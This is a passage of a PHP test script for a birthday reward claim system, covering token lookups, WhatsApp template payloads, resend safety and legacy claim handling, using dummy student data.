($reloadedClaim['instructions'] === $v3['instructions'] && strpos($reloadedClaim['instructions'], 'Totally different') === false)
    ? test_pass("IMMUTABILITY: Claimed student's instructions remain unchanged after admin settings update")
    : test_fail("Claimed instructions mutated when admin settings were updated!");

// 6. Permanent Instruction URL Resolution
echo "  [Permanent Instruction Page Access Verification]\n";
$claimLookupByToken = get_birthday_claim_by_token($pdo, $snapToken);
($claimLookupByToken && $claimLookupByToken['person_identity'] === $snapPid)
    ? test_pass("get_birthday_claim_by_token() correctly resolves claim by token")
    : test_fail("get_birthday_claim_by_token() failed to resolve valid claim");

$invalidLookup = get_birthday_claim_by_token($pdo, 'invalid_non_existent_token_12345');
($invalidLookup === null)
    ? test_pass("get_birthday_claim_by_token() returns null for invalid token (no IDOR / leak)")
    : test_fail("get_birthday_claim_by_token() did not return null for invalid token");

// 7. Communication Event Registration & Meta Template Support
echo "  [Communication Event & WhatsApp Payload Verification]\n";
$tplFileContent = file_get_contents(__DIR__ . '/communication-templates.php');
(strpos($tplFileContent, "'birthday_reward_claimed'") !== false)
    ? test_pass("'birthday_reward_claimed' event registered in communication-templates.php")
    : test_fail("'birthday_reward_claimed' not registered in communication-templates.php");

$claimedEventCheck = $pdo->prepare("
    INSERT OR REPLACE INTO communication_event_mappings (event_name, template_name, parameter_mappings)
    VALUES ('birthday_reward_claimed', 'pepp_birthday_reward_claimed', '[]')
");
$claimedEventCheck->execute();
$hasEventInDb = (bool)$pdo->query("SELECT 1 FROM communication_event_mappings WHERE event_name = 'birthday_reward_claimed'")->fetchColumn();
$hasEventInDb
    ? test_pass("'birthday_reward_claimed' event present in communication_event_mappings table")
    : test_fail("'birthday_reward_claimed' missing from communication_event_mappings table");

// 8. CommunicationEngine Template Resolution & URL Button No-Collision
// Insert mock Meta template with Body {{1}}, {{2}}, {{3}} and dynamic URL Button {{1}}
// Canonical Meta Category: MARKETING (as recommended and validated by Meta during template creation)
$pdo->prepare("DELETE FROM communication_templates WHERE template_name = 'pepp_birthday_reward_claimed'")->execute();
$pdo->prepare("
    INSERT INTO communication_templates (template_name, channel, status, category, meta_data)
    VALUES (
        'pepp_birthday_reward_claimed',
        'whatsapp',
        'approved',
        'MARKETING',
        ?
    )
")->execute([json_encode([
    'components' => [
        [
            'type' => 'BODY',
            'text' => "🎁 Your PEPP Birthday Reward is Ready!\n\nDear *{{1}}*,\n\nYour birthday reward has been successfully claimed.\n\n🎟️ Coupon Code: *{{2}}*\n📅 Valid Until: *{{3}}*\n\nTeam PEPP Learning"
        ],
        [
            'type' => 'BUTTONS',
            'buttons' => [
                [
                    'type' => 'URL',
                    'text' => 'Read Instructions',
                    'url' => 'https://pepplearning.in/admissions/birthday-instructions.php/{{1}}'
                ]
            ]
        ]
    ]
])]);

// Verify canonical template category is strictly MARKETING and never assumed as UTILITY
$tplRow = $pdo->query("SELECT category FROM communication_templates WHERE template_name = 'pepp_birthday_reward_claimed'")->fetch(PDO::FETCH_ASSOC);
(($tplRow['category'] ?? '') === 'MARKETING')
    ? test_pass("Canonical category for 'pepp_birthday_reward_claimed' is strictly MARKETING (not Utility)")
    : test_fail("Template category mismatch: expected MARKETING, got " . ($tplRow['category'] ?? 'null'));

// Insert test event mapping for birthday_reward_claimed with body variables and URL button
$pdo->prepare("
    INSERT OR REPLACE INTO communication_event_mappings (event_name, template_name, parameter_mappings)
    VALUES ('birthday_reward_claimed', 'pepp_birthday_reward_claimed', ?)
")->execute([json_encode([
    '1' => ['type' => 'variable', 'value' => 'student_name'],
    '2' => ['type' => 'variable', 'value' => 'coupon_code'],
    '3' => ['type' => 'variable', 'value' => 'valid_until']
])]);

$engine = CommunicationEngine::getInstance($pdo);
$claimContext = [
    'student_name'      => 'Amina Test',
    'coupon_code'       => 'BDAY50_SUPER',
    'valid_until'       => '31 Dec 2026',
    'instruction_token' => $snapToken,
    'instruction_url'   => 'https://pepplearning.in/admissions/birthday-instructions.php/' . $snapToken
];

$resolved = $engine->resolveEventTemplate('birthday_reward_claimed', $claimContext);
($resolved !== null)
    ? test_pass("resolveEventTemplate() successfully resolves 'birthday_reward_claimed'")
    : test_fail("Failed to resolve 'birthday_reward_claimed'");

// Build final WhatsApp payload via provider
require_once __DIR__ . '/includes/communication/Providers/WhatsAppCloudProvider.php';
$provider = new WhatsAppCloudProvider('test_biz', 'test_phone', 'test_token');
$payload = $provider->buildMessagePayload('919876543210', 'Birthday Claim', '', '', [], $resolved);

$bodyComp = null;
$buttonComp = null;
if (!empty($payload['template']['components'])) {
    foreach ($payload['template']['components'] as $comp) {
        if ($comp['type'] === 'body') {
            $bodyComp = $comp;
        }
        if ($comp['type'] === 'button') {
            $buttonComp = $comp;
        }
    }
}

($bodyComp !== null && count($bodyComp['parameters']) === 3)
    ? test_pass("Meta payload Body component contains exactly 3 variables (name, coupon, validity)")
    : test_fail("Meta body parameter count mismatch");

// Verify body parameters match values
$bodyParams = $bodyComp['parameters'] ?? [];
(($bodyParams[0]['text'] ?? '') === 'Amina Test' && ($bodyParams[1]['text'] ?? '') === 'BDAY50_SUPER' && ($bodyParams[2]['text'] ?? '') === '31 Dec 2026')
    ? test_pass("Meta body parameters {{1}}, {{2}}, {{3}} mapped accurately without truncation")
    : test_fail("Meta body parameter value mismatch");

// Verify button component parameter matches instruction_token and has NO collision with body
$btnParamText = $buttonComp['parameters'][0]['text'] ?? '';
($buttonComp !== null && $btnParamText === $snapToken)
    ? test_pass("Meta payload dynamic URL Button component contains instruction_token without body parameter collision")
    : test_fail("Meta payload missing dynamic URL button with instruction_token");

// 9. Post-Claim WhatsApp Resend Safety
echo "  [Post-Claim WhatsApp Resend Safety Verification]\n";
$claimTestRecord = get_birthday_claim_by_token($pdo, $snapToken);
$dummyStudent = [
    'user_id' => $snapUid,
    'name' => 'Amina Test',
    'whatsapp_number' => '9876543210',
    'whatsapp_country_code' => '91',
    'mobile_number' => '9876543210',
    'email' => 'amina.test@example.com'
];

// Dispatch initial claim WhatsApp
$claimQueueId = dispatch_birthday_claim_whatsapp($pdo, $claimTestRecord, $dummyStudent, $snapPid);
(is_numeric($claimQueueId) && $claimQueueId > 0)
    ? test_pass("dispatch_birthday_claim_whatsapp() successfully enqueued post-claim WhatsApp")
    : test_fail("Failed to enqueue post-claim WhatsApp");

// Check that claim record was updated with queue ID and status 'queued'
$claimAfterQueue = get_birthday_claim_by_token($pdo, $snapToken);
($claimAfterQueue['claim_whatsapp_queue_id'] == $claimQueueId && in_array($claimAfterQueue['claim_whatsapp_status'], ['queued', 'sent'], true))
    ? test_pass("Claim record updated with queue ID and claim_whatsapp_status")
    : test_fail("Claim record not updated with queue details");

// Set queue item status to pending to verify active in-flight check
$pdo->prepare("UPDATE communication_queue SET status = 'pending' WHERE id = ?")->execute([$claimQueueId]);

// Resend while queued/in-flight must be rejected
$reCheckClaim = $pdo->prepare("
    SELECT c.*, q.status AS queue_status
    FROM birthday_reward_claims c
    LEFT JOIN communication_queue q ON c.claim_whatsapp_queue_id = q.id
    WHERE c.instruction_token = ?
");
$reCheckClaim->execute([$snapToken]);
$activeClaimRow = $reCheckClaim->fetch(PDO::FETCH_ASSOC);
$qsActive = $activeClaimRow['queue_status'] ?? '';
(in_array($qsActive, ['pending', 'queued', 'processing', 'scheduled'], true))
    ? test_pass("Resend is blocked while initial claim message is queued/processing")
    : test_fail("Resend was not recognized as queued");

// Simulate failure of the initial claim WhatsApp
$pdo->prepare("UPDATE communication_queue SET status = 'failed', error_message = 'Simulated timeout' WHERE id = ?")->execute([$claimQueueId]);
$pdo->prepare("UPDATE birthday_reward_claims SET claim_whatsapp_status = 'failed' WHERE id = ?")->execute([$claimAfterQueue['id']]);

// Now resend the failed claim WhatsApp
$claimFailedRecord = get_birthday_claim_by_token($pdo, $snapToken);
$resendQueueId = dispatch_birthday_claim_whatsapp($pdo, $claimFailedRecord, $dummyStudent, $snapPid);
(is_numeric($resendQueueId) && $resendQueueId > 0 && $resendQueueId !== $claimQueueId)
    ? test_pass("Failed claim WhatsApp resend generates brand NEW queue item ({$resendQueueId} != {$claimQueueId})")
    : test_fail("Failed claim resend did not generate new queue ID");

// Verify that resend NEVER alters claimed_at, coupon_code, or creates duplicate claim
$claimAfterResend = get_birthday_claim_by_token($pdo, $snapToken);
($claimAfterResend['claimed_at'] === $claimTestRecord['claimed_at'] && $claimAfterResend['coupon_code'] === 'BDAY50_SUPER')
    ? test_pass("Resend preserves claimed_at, coupon_code, and never creates a second claim")
    : test_fail("Resend mutated claim timestamp or coupon code!");

// 10. Legacy Claim Handling
echo "  [Legacy Claim Handling Verification]\n";
$legacyPid = '919999000222';
$legacyUid = 'PEPP2026LEGACY1';
$legacyDate = date('Y-m-d');

// Insert legacy claim (reward_version_id and instruction_token are NULL)
$pdo->prepare("
    INSERT INTO birthday_reward_claims (
        person_identity, student_id, birthday_date, claimed_at
    ) VALUES (
        ?, ?, ?, '2025-05-15 10:30:00'
    )
")->execute([$legacyPid, $legacyUid, $legacyDate]);

$loadedLegacy = get_birthday_claim_by_identity($pdo, $legacyPid, $legacyDate);
($loadedLegacy && !empty($loadedLegacy['is_legacy']) && empty($loadedLegacy['instruction_token']))
    ? test_pass("Legacy claim is explicitly detected with is_legacy=true")
    : test_fail("Legacy claim was not marked as legacy");

(empty($loadedLegacy['instructions']) && empty($loadedLegacy['terms']))
    ? test_pass("Legacy claim does not fabricate historical instructions or terms")
    : test_fail("Legacy claim fabricated non-existent historical instructions");

// Clean up Phase 2 test records
$pdo->prepare("DELETE FROM birthday_reward_claims WHERE person_identity IN (?, ?)")->execute([$snapPid, $legacyPid]);
$pdo->prepare("DELETE FROM communication_queue WHERE id IN (?, ?)")->execute([$claimQueueId, $resendQueueId]);
$pdo->prepare("DELETE FROM communication_event_mappings WHERE event_name = 'birthday_reward_claimed'")->execute();
$pdo->prepare("DELETE FROM communication_templates WHERE template_name = 'pepp_birthday_reward_claimed'")->execute();
$pdo->exec("DELETE FROM birthday_reward_versions");


// ════════════════════════════════════════════════════════════════════════
// SUMMARY
// ════════════════════════════════════════════════════════════════════════
echo "\n══════════════════════════════════════════════════════════════════\n";
echo "  BIRTHDAY SYSTEM COMPLETE AUDIT RESULTS\n";
echo "══════════════════════════════════════════════════════════════════\n";
echo "  ✅ Passed: {$pass}\n";
echo "  ❌ Failed: {$fail}\n";
echo "  ⏭️  Skipped: {$skip}\n";
echo "  Total:   " . ($pass + $fail + $skip) . "\n";
echo "══════════════════════════════════════════════════════════════════\n";

if ($fail > 0) {
    echo "\n  ⚠️  AUDIT FAILED — {$fail} test(s) require attention.\n";
    echo "  Failed tests:\n";
    foreach ($results as $r) {
        if ($r['status'] === 'FAIL') {
            echo "    • {$r['label']}" . (!empty($r['reason']) ? " — {$r['reason']}" : '') . "\n";
        }
    }
} else {
    echo "\n  🎉 ALL AUDIT & REGRESSION TESTS PASSED!\n";
}

echo "\n";
exit($fail > 0 ? 1 : 0);
